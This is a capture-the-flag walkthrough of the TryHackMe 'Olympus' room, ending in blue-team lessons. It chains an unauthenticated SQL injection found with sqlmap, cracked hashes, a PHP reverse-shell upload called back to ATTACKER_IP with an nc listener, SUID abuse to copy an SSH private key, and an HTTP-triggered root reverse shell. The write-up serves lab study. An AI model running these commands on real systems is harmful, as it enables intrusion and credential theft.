# [Olympus](https://tryhackme.com/room/olympusroom)

| Field      | Details                          |
|------------|----------------------------------|
| Room       | [Olympus](https://tryhackme.com/room/olympusroom) |
| Platform   | TryHackMe                        |
| Difficulty | Medium                            |
| Category   | Web Exploitation, Linux PrivEsc  |
| Tags       | SQL Injection, Virtual Host Discovery, Unrestricted File Upload, SUID Abuse, SSH Key Cracking, Root Backdoor |

---

## Overview

The room's own tagline is "My first CTF!" which is a fitting warning, because Olympus does not hold your hand. Everything here chains: a leaky CMS search bar spills database contents, the database spills a hidden subdomain, the subdomain spills a shell, and a completely undocumented SUID binary spills a god's SSH key. By the end you are logged in as Zeus himself and standing on top of a root backdoor that Prometheus apparently left lying around for exactly this reason.

From a blue team perspective this room is a good reminder that compromise rarely comes from one big vulnerability. It comes from four small ones lined up in a row: an outdated CMS with a known unauthenticated SQLi, credential reuse across a hidden vhost, an unfiltered upload feature, and an SUID binary nobody audited because it wasn't in the usual privesc checklists. None of these individually is catastrophic. Together they are root.

---

## Enumeration

### Port Scan

```
nmap -sS -sV -p- <TARGET_IP>
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4
80/tcp open  http    Apache httpd 2.4.41 (Ubuntu)
```

Just the two, and neither is vulnerable out of the box. The web server is where this room actually happens.

```
Attack surface
┌───────────────────────────────────────────┐
│  olympus.thm                                │
│         ┌──────────┐                       │
│         │  Port 22 │◄── key-based, later    │
│         └──────────┘                       │
│         ┌──────────┐                       │
│         │  Port 80 │◄── everything starts here
│         └──────────┘                       │
└───────────────────────────────────────────┘
```

### Hosts File and Directory Fuzzing

The IP alone doesn't serve the real site, it redirects to a hostname, so that goes in `/etc/hosts` first:

```bash
echo "<TARGET_IP> olympus.thm" | sudo tee -a /etc/hosts
```

The landing page itself is mostly static and gives up nothing in the source. A directory scan with a small wordlist (`common.txt`) comes back empty, which is the first trap in the room. Switching to a bigger SecLists wordlist finds the real content:

```bash
feroxbuster -u http://olympus.thm -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

```
/~webmaster   (Status: 301) ──► /~webmaster/
```

`~webmaster` leads to an install of **Victor CMS**, an old and thoroughly vulnerable content management system.

```
Enumeration chain
┌────────────────────────────────────────┐
│  olympus.thm root ──► static, no leads  │
│  small wordlist    ──► nothing          │
│  bigger wordlist   ──► /~webmaster      │
│  /~webmaster       ──► Victor CMS       │
└────────────────────────────────────────┘
```

---

## Initial Access

### Unauthenticated SQL Injection

Victor CMS has a public, unauthenticated SQL injection in its category/search handling (tracked in public exploit databases against this CMS version, `cat_id` parameter). No login needed, no filter to dodge.

```bash
sqlmap -r request.raw --batch --dbs
```

```
available databases:
[*] olympus
[*] information_schema
[*] mysql
[*] performance_schema
[*] phpmyadmin
```

Dumping the `olympus` database:

```bash
sqlmap -r request.raw --batch -D olympus --tables
```

```
[6 tables]
+------------+
| categories |
| chats      |
| comments   |
| flag       |
| posts      |
| users      |
+------------+
```

The `flag` table hands over the first flag on the spot, no exploitation past this point required for it. The `users` table is where things get interesting:

```
user_name    user_email                 user_password (bcrypt)
prometheus   prometheus@olympus.thm     $2y$10$YC6uoM...
root         root@chat.olympus.thm      $2y$10$lcs4XW...
zeus         zeus@chat.olympus.thm      $2y$10$cpJKDX...
```

Two of those three emails point at a domain that was never seen anywhere on the main site: `chat.olympus.thm`. That's a hidden virtual host, leaked straight out of a database dump the same way the certificate leaked a hostname in the TakeOver room. Added to `/etc/hosts` for later.

### Cracking Credentials

The three bcrypt hashes go into John against rockyou. Only one cracks: `prometheus`. The CMS login itself turns out to be a rabbit hole once authenticated (register and admin panel both dead ends), but the same credentials work again on the subdomain just discovered.

```
Credential exposure chain
┌───────────────────────────────────────────────┐
│  Victor CMS unauthenticated SQLi                │
│         │                                       │
│  users table dumped ──► emails leak vhost        │
│         │                    └─► chat.olympus.thm│
│  hashes cracked ──► prometheus:<password>        │
│         │                                       │
│  Login on CMS ──► rabbit hole                    │
│  Login on chat.olympus.thm ──► real foothold      │
└───────────────────────────────────────────────┘
```

### File Upload to Shell

Logging into `chat.olympus.thm` as `prometheus` opens a private messaging feature with file upload. There is no upload filter at all, so a PHP reverse shell goes straight up:

```bash
# generic php reverse shell, e.g. pentestmonkey's php-reverse-shell.php
```

The catch: uploaded filenames get randomized server-side, so the shell's new name isn't visible from the UI. The same SQL injection used earlier solves this, since uploaded filenames are stored in the `chats` table:

```bash
sqlmap -r request.raw --batch -D olympus -T chats --dump --fresh-queries
```

That returns the randomized filename, and the shell fires from the uploads directory:

```
http://chat.olympus.thm/uploads/<randomized_name>.php?ip=<ATTACKER_IP>&port=<PORT>
```

Catch it with a listener:

```bash
nc -lvnp <PORT>
```

Shell lands as `www-data`.

```
Foothold chain
┌─────────────────────────────────────────────┐
│  chat.olympus.thm login (cracked creds)      │
│         │                                    │
│  Unfiltered upload ──► PHP reverse shell      │
│         │                                    │
│  Filename randomized ──► SQLi dumps 'chats'   │
│         │              table ──► real filename│
│  Browse to uploaded shell ──► shell as www-data│
└─────────────────────────────────────────────┘
```

`/home/zeus/user.flag` is readable at this point and is the second flag.

---

## Privilege Escalation

### An Undocumented SUID Binary

Standard privesc enumeration (linpeas) doesn't flag anything obvious in the usual sudo/cron/capabilities categories. Checking SUID binaries manually turns up something linpeas doesn't call out as interesting: `/usr/bin/cputils`, owned by `zeus`, SUID bit set.

```bash
find / -perm -4000 -type f 2>/dev/null
strings /usr/bin/cputils
```

It's not in GTFOBins, because it's a custom binary, not a well-known one. Running it shows it does exactly what the name suggests: copies a file from one location to another, executing with `zeus`'s privileges, and the copied file ends up readable to whoever ran it. That's enough to pull a copy of Zeus's private key somewhere `www-data` can read:

```bash
cputils /home/zeus/.ssh/id_rsa /tmp/zeus_id_rsa
cat /tmp/zeus_id_rsa
```

### Cracking the SSH Key and Escalating to Zeus

The key is passphrase-protected, so it goes through `ssh2john` and John:

```bash
ssh2john /tmp/zeus_id_rsa > zeus.hash
john zeus.hash --wordlist=rockyou.txt
```

Cracked passphrase in hand, SSH in directly as Zeus:

```bash
chmod 600 zeus_id_rsa
ssh -i zeus_id_rsa zeus@olympus.thm
```

```
SUID abuse chain
┌────────────────────────────────────────────┐
│  /usr/bin/cputils (SUID, runs as zeus)      │
│         │                                    │
│  Copies /home/zeus/.ssh/id_rsa ──► readable  │
│         │                                    │
│  ssh2john + john ──► passphrase cracked      │
│         │                                    │
│  ssh as zeus ──► user shell, upgraded access │
└────────────────────────────────────────────┘
```

### The Root Backdoor

Zeus's home directory contains a note: Prometheus left a permanent root backdoor on the box, and backdoors that live on a webserver are usually reachable over HTTP. Sure enough, `/var/www/html` contains an oddly-named directory and PHP file, owned by the `zeus` group, that was invisible before but readable now.

Browsing to it over HTTP asks for a password. As Zeus, the PHP source itself can be read directly off disk, and the password is sitting right in it, along with the mechanism: the page accepts `ip` and `port` parameters and, once the correct password is supplied, executes a privileged binary that spawns a shell:

```
uname -a; w; /lib/defended/libc.so.99
```

Supplying the password and attacker IP/port over the web form spawns a reverse shell running as root.

```
Root backdoor chain
┌──────────────────────────────────────────────┐
│  zeus.txt hint ──► "permanent root access"     │
│         │                                       │
│  /var/www/html/<hidden dir>/<file>.php          │
│  (zeus-group readable) ──► password + logic     │
│  recovered by reading source as zeus            │
│         │                                       │
│  HTTP request w/ password + ip/port             │
│  ──► executes /lib/defended/libc.so.99          │
│  ──► root reverse shell                          │
└──────────────────────────────────────────────┘
```

Root flag sits in `/root`, the third flag.

### The Bonus Flag

The room hints that a fourth flag lives somewhere under `/etc`, and every flag in this room follows the same `flag{...}` format, so it's a `grep` away rather than a manual crawl:

```bash
grep -irl 'flag{' /etc/
```

---

## Attack Path Summary

```
[Recon]
  │
  ├─ nmap ──► 22/80 open
  └─ small wordlist fails, bigger wordlist ──► /~webmaster (Victor CMS)
         │
[Initial Access]
  │
  └─ Unauthenticated SQLi (cat_id) ──► dump olympus DB
         ├─ flag table ──► Flag 1
         └─ users table ──► emails leak chat.olympus.thm
                          ──► hashes cracked (prometheus)
         │
[Foothold]
  │
  └─ chat.olympus.thm login ──► unfiltered upload ──► PHP shell
                              ──► SQLi on 'chats' table reveals
                                  randomized filename
                              ──► shell as www-data
                              ──► Flag 2 (zeus user flag)
         │
[Privilege Escalation]
  │
  ├─ /usr/bin/cputils (SUID, runs as zeus) ──► copy zeus's id_rsa
  ├─ ssh2john + john ──► passphrase cracked ──► ssh as zeus
  └─ hidden webroot backdoor (zeus-group readable PHP)
                          ──► password recovered from source
                          ──► HTTP-triggered root shell
                          ──► Flag 3 (root)
         │
[Bonus]
  │
  └─ grep -irl 'flag{' /etc/ ──► Flag 4
```

---

## Flags

| # | Question                                   | Where it came from                          |
|---|---------------------------------------------|----------------------------------------------|
| 1 | First flag                                  | `flag` table, dumped via SQL injection        |
| 2 | User flag                                   | `/home/zeus/user.flag`                        |
| 3 | Root flag                                   | `/root` after triggering the web backdoor     |
| 4 | Bonus flag                                  | Somewhere under `/etc`, found via `grep -irl 'flag{' /etc/` |

*(Exact flag strings intentionally left out here since they're specific to your deployment)*

---

## Blue Team Takeaways

**Outdated CMS Installs Are Free Reconnaissance for Attackers**
Victor CMS's `cat_id` SQL injection is public knowledge and requires zero authentication to exploit. Any internet-facing CMS needs a patch cadence and, ideally, a WAF sitting in front of known-vulnerable request patterns. Version fingerprinting during external recon should trigger an internal ticket, not just a pentester's excitement.

**Database Dumps Leak More Than Credentials**
The `chat.olympus.thm` vhost was never linked anywhere on the site. It leaked purely because two user emails happened to reference it, and a SQLi dump grabbed those emails along with everything else. Any data exposed through injection should be treated as fully compromised, including fields that look incidental like email domains, internal hostnames, or comments.

**Unrestricted File Upload Is Still Common and Still Fatal**
The chat app accepted any file extension with no content-type or magic-byte validation, and the only "protection" was a randomized filename, which turned out to be discoverable through the exact same SQL injection already in play. Filename randomization is not a security control if the mapping is stored somewhere else exploitable. Real fixes: extension allowlists, content inspection, and serving uploads from a location with no execute permission.

**Undocumented SUID Binaries Are Blind Spots for Automated Tools**
`cputils` didn't appear in GTFOBins and wasn't flagged as an obvious finding by linpeas, because it's custom, not a known LOLBin. Automated privesc scanners are a starting point, not a finish line. Every SUID binary on a production system should be inventoried and justified; if a team can't explain why a binary needs the SUID bit, it shouldn't have it.

**"Temporary" Backdoors Left By Developers Don't Stay Temporary**
Prometheus's root backdoor was clearly meant as a maintenance shortcut, hidden by an obscure directory name rather than actual access control, and left permission bits generous enough for a compromised lower-privileged account to read its own source and recover the password. Security through obscurity buys nothing once an attacker has a foothold. Any debug or maintenance access path needs to be removed before go-live, not just hidden.

---

*Turns out getting to Olympus didn't require lightning bolts, just SQLi, a leaky vhost, and one very talkative custom binary.*
